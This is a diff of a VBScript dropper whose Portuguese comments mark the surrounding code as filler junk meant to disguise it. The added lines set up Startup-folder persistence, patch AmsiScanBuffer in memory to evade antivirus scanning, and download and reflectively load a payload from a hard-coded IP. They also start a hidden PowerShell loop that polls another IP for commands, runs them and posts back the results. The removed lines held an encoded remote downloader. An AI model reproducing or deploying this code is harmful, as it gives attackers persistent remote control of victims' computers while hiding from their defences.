@@ -552,49 +552,41 @@ End Sub
 ' ========================================
 ' SEU CÓDIGO REAL (DOWNLOAD + EXECUÇÃO)
 ' ========================================
-Set a = CreateObject("WScript.Shell") 
-Set f = CreateObject("Scripting.FileSystemObject") 
-  
-' --- PERSISTÊNCIA (STARTUP) ---
-Dim scriptPath, startupFolder, targetPath 
-scriptPath = WScript.ScriptFullName 
-startupFolder = a.SpecialFolders("Startup") 
-targetPath = startupFolder & "\" & f.GetFileName(scriptPath) 
-If Not f.FileExists(targetPath) Then 
-    On Error Resume Next 
-    f.CopyFile scriptPath, targetPath, False 
-    On Error GoTo 0 
-End If 
+Set a = CreateObject("WScript.Shell")
+Set f = CreateObject("Scripting.FileSystemObject")
 
-' ==============================================================================
-' 1. SISTEMA ANTIGO (URL VISÍVEL E EDITÁVEL)
-' ==============================================================================
-' Aqui você pode alterar a URL quando quiser
-Dim urlAntigo
-urlAntigo = "http://157.245.45.38/z.txt"
+Dim scriptPath, startupFolder, targetPath
+scriptPath = WScript.ScriptFullName
+startupFolder = a.SpecialFolders("Startup")
+targetPath = startupFolder & "\" & f.GetFileName(scriptPath)
+If Not f.FileExists(targetPath) Then
+    On Error Resume Next
+    f.CopyFile scriptPath, targetPath, False
+    On Error GoTo 0
+End If
 
-' Bloco AMSI (Compactado em uma linha para não chamar atenção, mas é o mesmo código)
+' AMSI Bypass (Memory Patch)
 Dim amsi
-amsi = "$c='using System;using System.Runtime.InteropServices;public class P{[DllImport(\""kernel32\"")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport(\""kernel32\"")]public static extern IntPtr LoadLibrary(string n);[DllImport(\""kernel32\"")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void B(){try{IntPtr l=LoadLibrary(\""amsi.dll\"" );if(l==IntPtr.Zero)return;IntPtr a=GetProcAddress(l,\""AmsiScanBuffer\"" );if(a==IntPtr.Zero)return;uint o;byte[] p={0xB8,0x57,0x00,0x07,0x80,0xC3};VirtualProtect(a,(UIntPtr)p.Length,0x40,out o);System.Runtime.InteropServices.Marshal.Copy(p,0,a,p.Length);VirtualProtect(a,(UIntPtr)p.Length,o,out o);}catch{}}};';Add-Type -TypeDefinition $c;[P]::B();"
+amsi = "$c='using System;using System.Runtime.InteropServices;public class P{[DllImport(\""kernel32\"")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport(\""kernel32\"")]public static extern IntPtr LoadLibrary(string n);[DllImport(\""kernel32\"")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void B(){try{IntPtr l=LoadLibrary(\""amsi.dll\"" );if(l==IntPtr.Zero)return;IntPtr a=GetProcAddress(l,\""AmsiScanBuffer\"" );if(a==IntPtr.Zero)return;uint o;byte[] p={0x8B,0x4C,0x24,0x18,0xC7,0x01,0x00,0x00,0x00,0x00,0x31,0xC0,0xC2,0x18,0x00};VirtualProtect(a,(UIntPtr)p.Length,0x40,out o);System.Runtime.InteropServices.Marshal.Copy(p,0,a,p.Length);VirtualProtect(a,(UIntPtr)p.Length,o,out o);}catch{}}};';" & _
+       "Add-Type -TypeDefinition $c;[P]::B();"
 
-' Monta o comando completo (AMSI + Download da URL Visível)
-Dim cmdAntigo
-cmdAntigo = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command " & _
-            """" & amsi & " IEX(New-Object Net.WebClient).DownloadString('" & urlAntigo & "')"""
+Dim ps, finalCmd
+ps = "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=3072;" & amsi & _
+     "$u='http://157.245.45.38/z.txt';" & _
+     "$b='';try{$b=(iwr -Uri $u -UseBasicParsing -TimeoutSec 20).Content}catch{};" & _
+     "if(!$b){$t1='%TEMP%\a.txt';if(Test-Path $t1){$b=gc $t1 -Raw}};" & _
+     "if(!$b){$t2='%TEMP%\b.txt';if(Test-Path $t2){$b=gc $t2 -Raw}};" & _
+     "if(!$b){exit};$b=$b.Replace('!!','A');" & _
+     "$bytes=[Convert]::FromBase64String($b);" & _
+     "$ms=New-Object IO.MemoryStream(,$bytes);" & _
+     "$asm=[Reflection.Assembly]::Load($ms.ToArray());" & _
+     "[ClassLibrary2.Executor]::Run();"
 
-' Executa SEM esperar (False)
-a.Run cmdAntigo, 0, False
+finalCmd = "cmd /c C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep unrestricted -C """ & ps & """ "
+a.Run finalCmd, 0, True
 
+a.Run "powershell -W 1 -NoP -Ep unrestricted -C ""$user='lumen';$clientId='PS-CLIENT-'+$env:COMPUTERNAME;$serverUrl='194.163.168.11/api/ping';$comandoUrl='194.163.168.11/api/get_comando';$resultUrl='194.163.168.11/api/command_result';try{$ip=(irm https://api.ipify.org -TimeoutSec 10).Trim()}catch{$ip='127.0.0.1'};while(1){try{$pingBody=@{user=$user;client_id=$clientId;ip=$ip}|ConvertTo-Json;Invoke-RestMethod -Uri $serverUrl -Method POST -Body $pingBody -ContentType 'application/json' -TimeoutSec 10;$cmdBody=@{user=$user;client_id=$clientId}|ConvertTo-Json;$cmdResponse=Invoke-RestMethod -Uri $comandoUrl -Method POST -Body $cmdBody -ContentType 'application/json' -TimeoutSec 10;if($cmdResponse.comando){try{$output=iex $cmdResponse.comando 2>&1|Out-String}catch{$output='ERRO: '+$_.Exception.Message};$resultBody=@{user=$user;client_id=$clientId;result=$output}|ConvertTo-Json;Invoke-RestMethod -Uri $resultUrl -Method POST -Body $resultBody -ContentType 'application/json' -TimeoutSec 10}}catch{};Start-Sleep 2}""", 0, False
 
-' ==============================================================================
-' 2. SISTEMA NOVO (OFUSCADO EM BASE64)
-' ==============================================================================
-' URL escondida: https://.../ps1.txt
-Dim b64New
-b64New = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGkAbAB1AG0AaQBuAGEAdAAxADIAMwAvAGwAdQBtAGUAbgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AcABzADEALgB0AHgAdAAnACkA"
-
-' Executa SEM esperar (False)
-a.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & b64New, 0, False
 ' ========================================
 ' CÓDIGO LIXO INOFENSIVO - PARTE 2 (200 LINHAS)
 ' ========================================
